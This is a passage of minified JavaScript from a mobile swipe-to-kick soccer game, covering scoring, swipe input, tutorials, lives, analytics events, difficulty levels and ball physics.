            e.x = width * XS.devicePixelRatio / stage.ratio / 2 + e.offset.x
        }), e.addScore = function(t, i, n) {
            if (t) {
                var r = t * e.multiplier;
                if (e.score += r, e.score > e.highscore && (e.highscore = e.score, e.isHighscore = !0, d.save("highscore", e.highscore, !0)), S.addRender(v), i) return E.showPoints(r, {
                    x: i.x,
                    y: i.y - 150
                }, n)
            }
        }, e.increase = e.addScore, e.setScore = function(t) {
            e.score = t, g()
        }, e.toFront = function() {
            stage.addChild(e)
        }, e.setColor = function(e, n, r) {
            t.tint = e, i.tint = n || e, a.tint = r || e
        }, d.onRefresh(e.refresh)
    });
    var A, P = new myScore,
        L = Container.expand(function() {
            var e, t = Container.call(this),
                i = p.spawn("circle"),
                n = [],
                o = [],
                a = .5,
                s = !1;
            t.velocity = {
                x: 0,
                y: 0
            }, i.alpha = 0, i.scale.set(2, 2), t.addChild(i), t.startVelocity = {
                x: 0,
                y: 0
            }, t.spin = 0;
            var l = {
                    x: 0,
                    y: 0
                },
                h = {
                    x: 0,
                    y: 0
                },
                d = (p.spawn("circle"), p.spawn("circle"), p.spawn("circle")),
                c = (p.spawn("circle"), p.spawn("circle"));

            function f() {
                return {
                    x: C.x + h.x,
                    y: C.y + h.y
                }
            }

            function g() {
                if (u.isPlaying && s) {
                    var l = f();
                    if (!(r.hipotenusa(e, l) < 30)) {
                        if (r.hipotenusa(o[o.length - 1], l) > 100 && o.push(l), function(e, i, n, r) {
                                if (!i) return;
                                var o = m.cycle("Line");
                                o.scale.set(1, 1), o.alpha = 1, o.draw(n || 1.2, r || 16777215, e.x, e.y, i.x, i.y), new Tween(o.scale, {
                                    x: o.scale.x,
                                    y: 0
                                }, a, Tween.easeout), t.addChild(o)
                            }(e, l), e = l, n.push(l), n.length > 3 && n.shift(), n.length > 1) {
                            var h = n[n.length - 1],
                                d = n[0];
                            t.velocity.x = h.x - d.x, t.velocity.y = h.y - d.y
                        }
                        i.x = l.x, i.y = l.y, Tween.clear(i), i.alpha = 1, i.scale.set(4, 4), new Tween(i.scale, {
                            x: 0,
                            y: 0
                        }, a, Tween.easeout);
                        var c = p.cycle("tracer");
                        c.x = l.x, c.y = l.y, c.scale.set(1, 1), new Tween(c.scale, {
                            x: 0,
                            y: 0
                        }, a, Tween.easeout), t.addChild(c)
                    }
                }
            }
            d.tint = 16711680, c.tint = 65280, d.scale.set(.7, .7), c.scale.set(.4, .4), u.addChild(t), stage.on("up", function(t) {
                e = null, S.remove(g)
            }), stage.on("down", function(t) {
                u.isPlaying && (n = [], o = [], historytest = [], l || (l = {
                    x: C.x,
                    y: C.y
                }), h = {
                    x: l.x - C.x,
                    y: l.y - C.y
                }, e = f(), o.push(e), S.add(g))
            }), t.getSpin = function() {
                if (o && o.length) {
                    1 == o.length && o.push({
                        x: o[0].x,
                        y: o[0].y - 100
                    }), 2 == o.length && (o.push({
                        x: o[1].x,
                        y: o[1].y
                    }), o[1].x += (o[0].x - o[1].x) / 2, o[1].y += (o[0].y - o[1].y) / 2);
                    var e = o[0],
                        i = o[2],
                        n = o[o.length - 1];
                    t.velocity.x = n.x - e.x, t.velocity.y = n.y - e.y, t.startAngle = r.getRotation(e, n), t.startVelocity.x = i.x - e.x, t.startVelocity.y = i.y - e.y, t.highestPoint = n, t.lastPoint = n;
                    for (var a = i.x < e.x, s = {
                            x: e.x,
                            y: e.y
                        }, l = {
                            x: n.x,
                            y: n.y
                        }, h = 0; h < o.length - 1; h++) {
                        var d = o[h];
                        d.y < t.highestPoint.y && (t.highestPoint = d), a && d.x <= s.x && (s = {
                            x: d.x,
                            y: d.y
                        }), !a && d.x >= s.x && (s = {
                            x: d.x,
                            y: d.y
                        })
                    }
                    for (var c = r.hipotenusa(s, e), u = 0; r.hipotenusa(l, e) > c && ++u < 1e3;) l.x += -t.velocity.x / 1e3, l.y += -t.velocity.y / 1e3;
                    return t.spin = Math.round((n.x - s.x) / 180), t.velRotation = r.getRotation(e, s), t.spinDistance = r.hipotenusa(s, l), o
                }
            }, t.enable = function(e) {
                s = !0, l = e
            }, t.disable = function() {
                s = !1
            }
        });
    myFinger = Container.expand(function() {
        var e, t, i, n = Container.call(this),
            r = p.spawn("finger"),
            o = 0;

        function s() {
            if (o += .15, i = Math.sin(o), "touch" == t) return i *= 20, r.x = 50 + 2 * i, void(r.y = 50 + i);
            "swipeUp" == t && (r.y = i *= 300)
        }

        function l() {
            function e() {
                var e = n.data.swipeAngleDist || 670;
                r.x = Math.sin(r.y / e) * (e * n.data.swipeToAngle) * 1.2
            }
            a.delayUnique("Finger", l, 70), r.alpha = 0, r.x = 50, r.y = -50, new Tween(r, {
                x: 0,
                y: 0,
                alpha: 1
            }, .2, Tween.easeout).callback = function() {
                new Tween(r, {
                    y: n.data.swipeToY || -1500,
                    x: n.data.swipeToX || 0
                }, .6, Tween.easein), a.delay(function() {
                    x.fadeOut(r, .2)
                }, 35), n.data.swipeToAngle && (S.add(e), a.delay(function() {
                    S.remove(e)
                }, 35.4))
            }
        }
        n.data = {}, r.anchor.set(0, .13), n.addChild(r), n.show = function(i, r) {
            if (!e && i) {
                if (e = !0, n.x = i.x, n.y = i.y, n.data = i, T.addChild(n), o = 999 * Math.random(), x.fadeIn(n), t = r || i.fingerAction || "touch", n.rotation = null != i.rotation ? i.rotation : n.y > 900 ? -1.3 : 0, n.scale.set(n.x > 1200 ? -1 : 1, 1), "swipeTo" == t) return l();
                S.add(s)
            }
        }, n.hide = function() {
            e && (e = !1, x.fadeOut(n, .2), a.delay(n.remove, 60), a.cancel("Finger"))
        }, n.remove = function() {
            b.removeChild(n), S.remove(s)
        }
    });
    var G = new myFinger,
        k = new function() {
            var e = this;
            u.addComponent(e), e.reset = function() {
                Modal.hide()
            }, e.flyModal = function(e) {
                var t = Modal.ModalOverlayContent.expand(function() {
                    Modal.ModalOverlayContent.call(this), this.addHeadline(e), this.blurClose = !0, this.innerHeight = 200
                });
                Modal.show(new t, !0, !0), s(Modal.hide, 60)
            }, e.tryAgain = function() {
                var t = [Host.Localize.Translate("Try again", {}, "Shown when a user failes to get 10 points in a game"), Host.Localize.Translate("Once more", {}, "Shown when a user failes to get 10 points in a game"), Host.Localize.Translate("Again", {}, "Shown when a user failes to get 10 points in a game"), Host.Localize.Translate("One more time", {}, "Shown when a user failes to get 10 points in a game")][4 * Math.random() | 0];
                e.flyModal(t)
            }, e.noMoreMoves = function() {
                e.flyModal(Host.Localize.Translate("No More Moves!"))
            }, e.goodJob = function() {
                var t = [Host.Localize.Translate("Good Job", {}, "Shown when the user does a good job"), Host.Localize.Translate("Awesome", {}, "Shown when the user does a good job"), Host.Localize.Translate("You're great!", {}, "Shown when the user does a good job"), Host.Localize.Translate("Excellent", {}, "Shown when the user does a good job")][4 * Math.random() | 0];
                e.flyModal(t)
            }, e.gameOver = function(e) {
                O("game over modal");
                var t = Host.Localize.Translate("Good"),
                    i = Host.Localize.Translate("Awesome"),
                    n = Host.Localize.Translate("You scored {score}!");
                P.isHighscore && (t = Host.Localize.Translate("Perfect"), i = Host.Localize.Translate("Excellent"), n = Host.Localize.Translate("New highscore {score}!"));
                var r = new Modal.GameEndModal({
                    headline: [t, i][2 * Math.random() | 0],
                    lead: Host.Localize.Translate(n, {
                        score: P.score
                    }, "Shows score on end screen"),
                    mainActionCallback: function() {
                        XS.showInterstitialAd(), Modal.hide(e || u.killAndRestart)
                    },
                    mainActionText: Host.Localize.Translate("Play Again"),
                    mainActionColor: 16477478
                });
                r.blurCallback = void 0, Modal.show(r)
            }
        },
        I = new(Container.expand(function(e) {
            var t = I = Container.call(this);
            u.addComponent(t);
            var i = [],
                n = [],
                o = [];
            t.lives = 0, t.maxLives = e || 3;
            for (var a = 0; a < t.maxLives; a++) {
                var s = new Container,
                    l = p.spawn("lives");
                l.scale.set(.25, .25);
                var h = p.spawn("liveslost");
                s.x = 140 * -a, s.addChild(l), s.addChild(h), i.push(l), n.push(h), o.push(s), t.addChild(s)
            }

            function d() {
                stage.addChild(t), t.x = (width / stage.ratio - 100) * XS.devicePixelRatio, t.y = 100 * XS.devicePixelRatio
            }
            t.increase = function(e) {
                t.setLives(t.lives + (e || 1))
            }, t.decrease = function() {
                t.setLives(t.lives - 1)
            }, t.setLives = function(e) {
                t.lives = r.hardLimit(e, 0, t.maxLives);
                for (var a = 0; a < t.maxLives; a++) l(a);

                function l(e) {
                    var r = e < t.lives,
                        a = i[e],
                        l = (n[e], 1 == a.alpha);
                    r != l && function() {
                        s = o[e], r ? (x.fadeIn(a, .5), s.scale.set(1, 1)) : (a.alpha = 0, s.scale.set(.6, .6));
                        x.bounceScaleFloor(s)
                    }()
                }
                d()
            }, XS.on("resize", d), t.reset = function() {
                t.setLives(t.maxLives)
            }, t.isFull = function() {
                return t.lives == t.maxLives
            }, d()
        })),
        O = console.log,
        F = new function() {
            var e, t, i = [],
                n = 0,
                r = !1;
            this.hasDisplayedAds, this.reset = function() {
                O("RESET TRACKING!!!!!!!!"), r = !1, !1
            }, this.startGame = function() {
                O("================= STARTGAME", r), r || (r = !0, e = h.getTime(), t = h.getTime(), n = 0, XS.track.gamePlayStart())
            }, this.gameOver = function() {
                r = !1, O("================= GAME OVER"), XS.track.customEvent("game_end", h.secondsFrom(e), {
                    goals: z.step,
                    stars: B
                }), !0
            }, this.FTUE = function() {
                if (!XS.data.hideTutorial) {
                    var e = "ftue_" + z.step;
                    if (!d.state[e]) {
                        if (d.save(e, 1), i[z.step]) return n++;
                        i[z.step] = !0, O("TRACKING", z.step), XS.track.customEvent("ftue", h.secondsFrom(t), {
                            ftue_step: z.step,
                            attempts: n
                        }), n = 0, t = h.getTime()
                    }
                }
            }, this.optionChange = function(e, t) {
                O("================= SND OPTION CHANGE"), XS.track.optionsChange(t, e ? 1 : 0)
            }
        },
        X = new(Container.expand(function() {
            var e = Container.call(this);
            u.addComponent(e), e.x = 1024, e.y = 2700;
            var t = [],
                i = {};
            e.keys = [];
            var n, r = !1;

            function a(t, a) {
                n = e.currentKey = t, r = !0, o.removeItem(e.keys, t);
                var s = i[t];
                1, (s.title || s.description) && Tutorial.show(e, 0, 0, s.title, s.description), b.toFront(e), e.update && Tick.start(e.update), delete e.vars.tracking
            }

            function l() {
                stage.addChild(e), e.x = width / stage.ratio / 2 * XS.devicePixelRatio, e.y = (e.alignTop ? 400 : height / stage.ratio - 70) * XS.devicePixelRatio
            }
            e.isActive = !XS.data.hideTutorial, e.isReplay = !1, e.vars = {}, e.alignTop = !0, e.reset = function() {
                if (e.isActive = !XS.data.hideTutorial, e.keys = o.clone(t), 0, e.vars = {}, r = !1, e.isReplay && n)
                    for (; e.keys[0] != n;) e.keys.shift();
                e.show()
            }, e.addTutorial = function(n, r, o, a) {
                t.push(n), e.keys.push(n), i[n] = {
                    key: n,
                    title: r,
                    description: o,
                    validation: a
                }
            }, e.show = function(t, n) {
                if (!r && e.isActive && (!t || e.keys[0] == t)) {
                    e.keys.length || e.finish();
                    t = t || function() {
                        for (var t in e.keys)
                            if (!i[e.keys[t]].validation || i[e.keys[t]].validation()) return e.keys[t]
                    }();
                    if (-1 == e.keys.indexOf(t)) return e.hide();
                    a(t, n)
                }
            }, e.finish = function() {
                X.addTutorial("Finish", Host.Localize.Translate("You're ready!"), Host.Localize.Translate("Make as many points as you can!", {
                    game_name: Config.shareTitle
                })), a("Finish"), e.isActive = !1, e.vars = {}, XS.data.hideTutorial = !0, s(e.hide, 240)
            }, e.hide = function() {
                e.update && Tick.stop(e.update), delete e.update, Tutorial.hide(), r && (r = !1, e.isActive)
            }, XS.on("resize", l), e.changeAlign = function(t) {
                e.alignTop = t, l()
            }
        }));

    function D(e, t, i) {
        return g.setup3D(new v(e, t, i))
    }
        m.register("Line", R, 40);
    var B = 0,
        z = new function() {
            var e = this,
                t = [],
                i = [],
                n = [],
                r = [],
                a = [],
                s = [
                    ["big", "mid", "center"],
                    ["big", "mid", "left"],
                    ["big", "mid", "right"],
                    ["big", "air", "center"],
                    ["big", "air", "left"],
                    ["big", "air", "right"]
                ],
                h = [
                    ["small", "mid", "center"],
                    ["small", "mid", "left"],
                    ["small", "mid", "right"],
                    ["small", "ground", "center"],
                    ["small", "ground", "left"],
                    ["small", "ground", "right"],
                    ["small", "air", "center"],
                    ["small", "air", "left"],
                    ["small", "air", "right"]
                ];
            e.reset = function() {
                e.difficulty = 0, e.step = 0, e.bullseyeVelocity = 0, e.bullseyeInc = 0, e.goalie = null, e.pickup = null, t = [s[0]], i = XS.data.hideTutorial ? ["left"] : [], n = [], r = [], a = [], e.next()
            }, e.next = function() {
                t.length || function() {
                    if (e.difficulty++, O("====== NEW STEP!!!!", e.difficulty, "TUTORIAL?", X.isActive), X.isActive) return O("RETRIEVED TUTORIAL"), e.difficulty = 0, t = [s[1], s[4], s[5], h[3], h[0], h[5], h[7], s[0], s[3], s[0], s[2], s[3]], n = [0, 0, 0, 0, 0, 0, 0, 250, 500, 0, 0, 300], r = [0, 0, 0, 0, 0, 0, 0, .025, .05, 0, 0, .05], a = [0, 0, 0, 0, 0, 0, 0, 0, 0, "static", "static", "static"], void(i = [0, 0, 0, "center", "center", "center", "center", "center", "center", "right", "left", "right"]);
                    if (i = o.shuffle([0, 0, 0, 0, 1, 1, 1, "center"]), n = [], r = [], a = [], 1 == e.difficulty) return void(t = o.shuffle(s, 2));
                    if (2 == e.difficulty) return void(t = o.shuffle(h, 2));
                    if (3 == e.difficulty) return t = o.shuffle(s, 2), n = o.shuffle([200, 200, 250, 250, 300]), void(r = o.shuffle([.06, .06, .06, .05, .04]));
                    if (4 == e.difficulty) return t = o.shuffle(s, 2), n = o.shuffle([500, 500, 500, 450, 400]), void(r = o.shuffle([.02, .02, .02, .03, .04]));
                    if (5 == e.difficulty) return t = o.shuffle(s, 2), n = o.shuffle([500, 500, 500, 450, 400]), r = o.shuffle([.02, .02, .02, .03, .04]), void(a = ["static", "static", "static", "static", "static"]);
                    if (6 == e.difficulty) return t = o.shuffle(s, 2), void(a = ["walk", "walk", "walk", "walk", "walk"]);
                    if (7 == e.difficulty) return t = o.shuffle(s, 2), n = o.shuffle([600, 600, 600, 450, 400]), r = o.shuffle([.03, .03, .03, .02, .04]), void(a = ["walk", "static", "walk", "static", "walk"]);
                    if (8 == e.difficulty) return t = o.shuffle(h, 2), n = o.shuffle([200, 200, 250, 250, 300]), void(r = o.shuffle([.06, .06, .06, .05, .04]));
                    if (9 == e.difficulty) return t = o.shuffle(h, 2), n = o.shuffle([500, 500, 500, 450, 400]), void(r = o.shuffle([.02, .02, .02, .03, .04]));
                    if (10 == e.difficulty) return t = o.shuffle(h, 2), n = o.shuffle([500, 500, 500, 450, 400]), r = o.shuffle([.02, .02, .02, .03, .04]), void(a = ["static", "static", "static", "static", "static"]);
                    if (11 == e.difficulty) return t = o.shuffle(h, 2), void(a = ["walk", "static", "walk", "static", "walk"]);
                    if (12 == e.difficulty) return t = o.shuffle(h, 2), e.bullseyeInc = .02, e.bullseyeVelocity = 600, void(a = ["walk", "static", "walk", "static", "walk"]);
                    if (e.difficulty >= 13) t = o.clone(s), t = o.shuffle(o.push(h, t), 5), n = o.shuffle([0, 0, 0, 100, 300, 500, 600]), r = o.shuffle([.02, .02, .02, .04, .06]), a = [0, 0, 0, "walk", "walk", "static", "static"]
                }(), e.step++, e.bullseye = t.shift(), e.pickup = i.shift() || 0, e.bullseyeVelocity = n.shift() || 0, e.bullseyeInc = r.shift() || 0, e.goalie = a.shift() || 0, X.isActive ? X.show() : l("swipe", function() {
                    0 == e.difficulty && G.show({
                        x: 1024,
                        y: $.sprite.y,
                        fingerAction: "swipeTo",
                        swipeToX: J.sprite.x - $.sprite.x,
                        swipeToY: -($.sprite.y - J.sprite.y),
                        rotation: 0,
                        swipeToAngle: 1
                    })
                }, 50)
            }
        },
        H = new Container;
    u.addChild(H);
    var N = p.spawn("background_bottom");
    N.anchor.set(.5, 0), H.addChild(N), H.width = 8e3, H.height = 1100;
    var U, W = new Container;
    u.addChild(W);
    for (var j = [], Y = 0; Y < 8; Y++)
        for (var V = 0; V < 120; V++) {
            (Z = p.spawn("audience_0" + _.value(5, 1))).x = 40 * V - 2200 + _.spectrum(10), Z.y = 44 * Y - 370 + _.spectrum(10), Z.alpha = .1 * Y + .4, Z.rotation = _.spectrum(20) / 100, W.addChild(Z), j.push(Z)
        }
    for (Y = 0; Y < 8; Y++)
        for (V = 0; V < 120; V++) {
            (Z = p.spawn("audience_0" + _.value(5, 1))).x = 40 * V - 2200 + _.spectrum(10), Z.y = 44 * Y - 780 + _.spectrum(10), Z.alpha = .05 * Y + .1, Z.rotation = _.spectrum(20) / 100, W.addChild(Z), j.push(Z)
        }
    for (V = 0; V < 5; V++) {
        var Z;
        (Z = p.spawn("flag_0" + _.value(2, 1))).x = 400 * V - 800 + _.spectrum(100), Z.y = 20 * _.spectrum(5) - 250, W.addChild(Z), Z.scale.set(.5 * Math.random() + .5), j.push(Z)
    }
    for (var V in j) j[V].pos = {
        x: j[V].x,
        y: j[V].y
    };
    (U = p.spawn("field_wall")).anchor.set(.99, 1), U.scale.set(1.7), W.addChild(U), (U = p.spawn("field_wall")).anchor.set(0, 1), U.scale.set(1.7), W.addChild(U), (U = p.spawn("field_wall")).y = -400, U.anchor.set(.99, 1), U.scale.set(1.3), W.addChild(U), (U = p.spawn("field_wall")).y = -400, U.anchor.set(0, 1), U.scale.set(1.3), W.addChild(U), (U = p.spawn("bg_gradient")).tint = 0, U.alpha = .5, U.y = -1e3, U.anchor.set(.5, 0), U.scale.set(12, 5), W.addChild(U);
    var q = p.spawn("field_markings");
    q.anchor.set(.5, 0), u.addChild(q), b.toFront(M);
    var K = new Container;

    function Q(e) {
        g.setup3D(this);
        var t = p.spawn("grass_0" + _.value(3, 1));
        this.z = 450 - 26 * e, this.x = _.spectrum(600), this.scale = .4 * Math.random() + .2, t.blendMode = 1, t.alpha = .5, this.sprite.addChild(t), K.addChild(this.sprite)
    }
    u.addChild(K);
    for (V = 0; V < 27; V++) new Q(V);
    var J, $, ee, te = new function() {
        var e = this;
        g.setup3D(e), e.sprite = new Container, e.scale = 1, e.z = 420;
        var t = [];
        t.push(D(-1200, 0, e.z));
        for (var i = 1; i < 4; i++) t.push(D(-1200, 0, e.z - 40 * i));
        for (t.push(D(-1200, 0, e.z - 200)), i = 1; i < 4; i++) t.push(D(480 * i - 1200, 0, e.z - 200));
        for (t.push(D(1200, 0, e.z - 200)), i = 1; i < 3; i++) t.push(D(1200, 0, e.z - 200 + 40 * i));
        for (t.push(D(1200, 0, e.z)), i = 0; i < t.length; i++);
        var n = new Container,
            r = p.spawn("archery");
        r.anchor.set(.5, 1), e.shadow = p.spawn("archery"), e.shadow.tint = 0, e.shadow.alpha = .1, M.addChild(e.shadow), n.addChild(r), e.sprite.addChild(n), K.addChild(e.sprite), e.checkHit = function() {
            return !(Math.abs($.position.y) > 680 || Math.abs($.position.x) > 1e3) && (1e3 - Math.abs($.position.x) < 100 || 680 - Math.abs($.position.y) < 100 ? (x.bounceScaleFloor(n), "border") : (x.bounceScaleFloor(n), "goal"))
        }, e.reset = function() {}, e.draw = function() {
            for (var e = 0; e < t.length - 1; e++);
        }, e.reset()
    };
    $ = new function() {
        var e = this;
        $ = this, e.isLaunched, g.setup3D(e);
        var t, i = new v;
        e.isOnAir = !1, e.canHit = !1, e.offset = {
            x: 0,
            y: 0
        }, e.sprite = new Container, e.shadow = p.spawn("ball_shadow");
        var n = p.spawn("Ball");
        n.y = -223, n.x = 10;
        var o = p.spawn("ball_shade");

        function s() {
            if (e.isLaunched && u.isPlaying) {
                if (e.isLaunched = !1, t) X.vars.onFinish ? (X.finish(), z.reset()) : z.next();
                else {
                    if (!X.isActive) {
                        if (!I.lives) return void(u.isPlaying && (F.gameOver(), y.play("gameover"), u.over(.1)));
                        I.decrease()
                    }
                    isRetry = !0, k.tryAgain()
                }
                e.reset()
            }
        }
        o.y = n.y, o.alpha = .3, e.sprite.addChild(n), K.addChild(e.sprite), M.add(e.shadow), e.reset = function(r) {
            a.delay(function() {
                ee = !1
            }, 30), I.visible = !X.isActive, F.FTUE(), e.isLaunched = !1, e.x = 0, e.y = 0, e.z = 0, e.scale = .3, e.offset = {
                x: 0,
                y: 0
            }, e.sprite.x = e.x, e.sprite.y = e.y, n.rotation = -1.4, e.canHit = !0, e.finalPos = 0, e.willHit = !1, i.reset(), x.fadeIn(e.sprite), e.shadow.alpha = .5, !r && isRetry || (te.reset(), J.reset(), ne.reset(), ie.reset()), X.isActive && ie.reset(), y.play("ready"), A.enable({
                x: 1024,
                y: 2124
            }), t = !1, isRetry = !1
        }, e.getPosition = function() {
            return {
                x: e.sprite.x,
                y: e.sprite.y + n.y * e.sprite.scale.y
            }
        }, e.launch = function() {
            if (G.hide(), a.cancel("swipe"), e.canHit && A.getSpin()) {
                F.startGame();
                var t = -Math.abs(A.startVelocity.y / 17);
                A.disable(), e.canHit = !0, e.isLaunched = !0, e.offset = {
                    x: 0,
                    y: 0
                }, e.isOnAir = !0, y.playRandom("kickball");
                var n, o, s = {},
                    l = {
                        center: {
                            x: 0,
                            m: 15
                        },
                        side: {
                            x: 20,
                            m: 35
                        },
                        rim: {
                            x: 34,
                            m: 60
                        },
                        out: {
                            x: 50,
                            m: 150
                        }
                    },
                    h = 15 - .0223 * (Math.abs(t) - 15) * 11,
                    d = 1,
                    c = Math.round(100 * A.velRotation) + 150;
                e.altitude = "air";
                var u = -350;
                A.highestPoint.y > 400 && (e.altitude = "mid"), A.highestPoint.y > 900 && (e.altitude = "ground"), A.highestPoint.y < 300 && (e.altitude = "air"), e.isOut = A.lastPoint.y < 10, "ground" == e.altitude && (t = -15, h = 15, d = 1, u += 250, s.center = {
                    center: 0,
                    sideC: .34,
                    sideF: -.34,
                    rimC: .5,
                    rimF: -.5,
                    outC: 1,
                    outF: -1
                }, s.side = {
                    center: -.28,
                    sideC: 0,
                    sideF: -.63,
                    rimC: .2,
                    rimF: -.75,
                    outC: .6,
                    outF: -1
                }, s.rim = {
                    center: -.48,
                    sideC: -.18,
                    sideF: -.5,
                    rimC: 0,
                    rimF: -.98,
                    outC: .3,
                    outF: -1.1
                }, s.out = {
                    center: -.72,
                    sideC: -.38,
                    sideF: -1.06,
                    rimC: -.2,
                    rimF: -1.2,
                    outC: -.1,
                    outF: -1.3
                }), "mid" == e.altitude && (t = -40, h = 8.3, d = .565, s.center = {
                    center: 0,
                    sideC: .1,
                    sideF: -.1,
                    rimC: .154,
                    rimF: -.154,
                    outC: .2,
                    outF: -.2
                }, s.side = {
                    center: -.093,
                    sideC: 0,
                    sideF: -.19,
                    rimC: .066,
                    rimF: -.24,
                    outC: .1,
                    outF: -.3
                }, s.rim = {
                    center: -.15,
                    sideC: -.05,
                    sideF: -.255,
                    rimC: 0,
                    rimF: -.3,
                    outC: .1,
                    outF: -.38
                }, s.out = {
                    center: -.23,
                    sideC: -.12,
                    sideF: -.33,
                    rimC: -.09,
                    rimF: -.38,
                    outC: -.05,
                    outF: -.4
                }), "air" == e.altitude && (t = e.isOut ? -60 : -50, h = 6.7, d = .466, u -= 250, s.center = {
                    center: 0,
                    sideC: .066,
                    sideF: -.066,
                    rimC: .1,
                    rimF: -.1,
                    outC: .154,
                    outF: -.154
                }, s.side = {
                    center: -.06,
                    sideC: 0,
                    sideF: -.123,
                    rimC: .04,
                    rimF: -.16,
                    outC: .08,
                    outF: -.19
                }, s.rim = {
                    center: -.104,
                    sideC: -.04,
                    sideF: -.17,
                    rimC: 0,
                    rimF: -.2,
                    outC: .04,
                    outF: -.25
                }, s.out = {
                    center: -.15,
                    sideC: -.09,
                    sideF: -.21,
                    rimC: -.049,
                    rimF: -.25,
                    outC: -.03,
                    outF: -.28
                });
                var f = function(t, i, n, o, a) {
                    var s, l, h, d = r.hardLimit(t, -120, 120),
                        c = (s = d, l = i, (h = Math.abs(s)) < l.center.m ? "center" : h < l.side.m ? "side" : h < l.rim.m ? "rim" : "out"),
                        u = {
                            x: 0,
                            r: 0
                        };
                    u.x = i[c].x + d / 15;
                    var f = function(e) {
                        var t = C.x - 1024;
                        r.hipotenusa({
                            x: J.x,
                            y: J.y
                        }, {
                            x: t,
                            y: J.y
                        }) < 600 && (t = J.x);
                        var i = t >= 0;
                        e < 0 && (i = !i);
                        var n = i ? "C" : "F";
                        return (t = Math.abs(t)) < 150 ? "center" : t < 700 ? "side" + n : t < 900 ? "rim" + n : "out" + n
                    }(d);
                    if (u.r = A.spinDistance > 30 ? n[c][f] : 0, e.finalPos = 800, u.r) "center" == f && (e.finalPos = 0), "sideC" == f && (e.finalPos = 700), "sideF" == f && (e.finalPos = -700), "rimC" == f && (e.finalPos = 800), "rimF" == f && (e.finalPos = -800);
                    else {
                        var p = e.z;
                        for (e.finalPos = 0; p < te.z;) e.finalPos += u.x * o, p += a
                    }
                    return d < 0 && (u.x *= -1, u.r *= -1, e.finalPos *= -1), J.debugPos(e.finalPos), u.r || (u.x = d), u
                }(c, l, s, d, h);
                n = f.x, o = f.r;
                var p = r.hipotenusa({
                    x: J.x,
                    y: J.y
                }, {
                    x: e.finalPos,
                    y: u
                });
                e.willHit = p < J.radius, Math.abs(e.finalPos) > 700 && (e.isOut = !0), e.isOut && (e.willHit = !1), i.setValues(n * d, t, h, o), new Tween(e, {
                    scale: .22
                }, .7, Tween.linear), [], T.shockwave({
                    x: e.sprite.x,
                    y: e.sprite.y - 200
                })
            }
        }, e.catched = function(t, n) {
            e.canHit && (e.canHit = !1, e.z = n.z - 4, i.z = -.5, i.x = .5 * t, i.y = 0, i.rotation = 0, y.play("catched"), T.shockwave({
                x: e.sprite.x,
                y: e.sprite.y - 200
            }), a.delay(s, 30), i.rotation *= -.2, e.finalPos = e.x)
        }, stage.on("up", function(t) {
            e.isLaunched || e.launch()
        }), S.add(function() {
            if (i.y += 1.3, e.y += i.y, e.x += i.x, n.rotation += r.hardLimit(i.rotation, -.3, .3), i.rotation || (n.rotation += i.x / 400), e.z += i.z, i.x += 5 * i.rotation, e.y > 0 && (i.y *= -.5, e.y = 0, e.isOnAir = !1, i.x += 20 * i.rotation, i.rotation *= .6, i.x *= .8, i.z *= .95), e.canHit && !(e.z < te.z)) {
                if (a.delay(s, 40), e.canHit = !1, e.position = {
                        x: e.x + e.offset.x,
                        y: e.y + e.offset.y
                    }, e.hitType = te.checkHit(), !e.hitType) return 1 == e.sprite.alpha && (x.fadeOut(e.sprite, .8), x.fadeOut(e.shadow, .2)), y.playRandom("lose");
                if ("goal" == e.hitType) {
                    if (e.z = te.z - 1, i.z = 0, i.rotation *= .1, i.x *= .1, !(t = J.tryHit())) return;
                    X.hide(), ee = !0, T.confetti()
                } else e.z -= 10, i.z *= -.2, i.rotation *= -.5, y.play("hitborder")
            }
        })
    }, X.alignTop = !1, X.addTutorial("0", Host.Localize.Translate("Let's play {game_name}!", {
        game_name: Config.shareTitle
    }), Host.Localize.Translate("Swipe on the ball to shoot in the bullseye!"), function() {
        return I.visible = !1, l("swipe", function() {
            G.show({
                x: 1024,
                y: $.sprite.y,
                fingerAction: "swipeTo",
                swipeToX: J.sprite.x - $.sprite.x,
                swipeToY: -($.sprite.y - J.sprite.y),
                rotation: 0
            })
        }, 40), !0
    }), X.addTutorial("1", Host.Localize.Translate("Good job!", {
        game_name: Config.shareTitle
    }), Host.Localize.Translate("Try hitting it on the side"), function() {
        return l("swipe", function() {
            G.show({
                x: 1024,
                y: $.sprite.y,
                fingerAction: "swipeTo",
                swipeToX: J.sprite.x - $.sprite.x,
                swipeToY: -($.sprite.y - J.sprite.y),
                rotation: 0
            })
        }, 40), !0
    }), X.addTutorial("2", Host.Localize.Translate("Aim a little higher now", {
        game_name: Config.shareTitle
    }), Host.Localize.Translate("Try to hit that bullseye!"), function() {
        return l("swipe", function() {
            G.show({
                x: 1024,
                y: $.sprite.y,
                fingerAction: "swipeTo",
                swipeToX: J.sprite.x - $.sprite.x,
                swipeToY: -($.sprite.y - J.sprite.y),
                rotation: 0
            })
        }, 40), !0
    }), X.addTutorial("3", Host.Localize.Translate("You're getting good at this", {
        game_name: Config.shareTitle
    }), Host.Localize.Translate("How about the other side?"), function() {
        return l("swipe", function() {
            G.show({
                x: 1024,
                y: $.sprite.y,
                fingerAction: "swipeTo",
                swipeToX: J.sprite.x - $.sprite.x,
                swipeToY: -($.sprite.y - J.sprite.y),
                rotation: 0
            })
        }, 40), !0
    }), X.addTutorial("6", Host.Localize.Translate("Collect stars for extra lives", {
        game_name: Config.shareTitle
    }), Host.Localize.Translate("This bullseye is smaller so aim carefully"), function() {
        return l("swipe", function() {
            G.show({
                x: 1024,
                y: $.sprite.y,
                fingerAction: "swipeTo",
                swipeToX: J.sprite.x - $.sprite.x,
                swipeToY: -($.sprite.y - J.sprite.y),
                rotation: 0
            })
        }, 40), !0
    }), X.addTutorial("7", Host.Localize.Translate("Aim a little higher", {
        game_name: Config.shareTitle
    }), Host.Localize.Translate("Get that star for extra lives!"), function() {
        return l("swipe", function() {
            G.show({
                x: 1024,
                y: $.sprite.y,
                fingerAction: "swipeTo",
                swipeToX: J.sprite.x - $.sprite.x,
                swipeToY: -($.sprite.y - J.sprite.y),
                rotation: 0
            })
        }, 40), !0
    }), X.addTutorial("8", Host.Localize.Translate("Excellent!", {
        game_name: Config.shareTitle
    }), Host.Localize.Translate("Let's hit it on the side"), function() {
        return l("swipe", function() {
            G.show({
                x: 1024,
                y: $.sprite.y,
                fingerAction: "swipeTo",
                swipeToX: J.sprite.x - $.sprite.x,
                swipeToY: -($.sprite.y - J.sprite.y),
                rotation: 0
            })
        }, 40), !0
    }), X.addTutorial("9", Host.Localize.Translate("How about a corner kick?", {
        game_name: Config.shareTitle
    }), Host.Localize.Translate("And get that star for extra lives!"), function() {
